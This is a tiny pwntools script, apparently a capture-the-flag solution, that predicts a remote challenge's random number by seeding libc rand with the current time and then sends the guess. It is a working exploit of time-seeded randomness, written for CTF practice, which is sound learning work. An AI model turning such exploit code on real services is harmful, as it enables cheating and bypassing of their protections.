#!/usr/bin/python 
from pwn import *
from ctypes import *

r = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#p = process("./random")
p = remote("ctf.j0n9hyun.xyz", 3014)

r.srand(r.time(0))

guess = r.rand()

p.sendline(str(guess))

p.interactive()
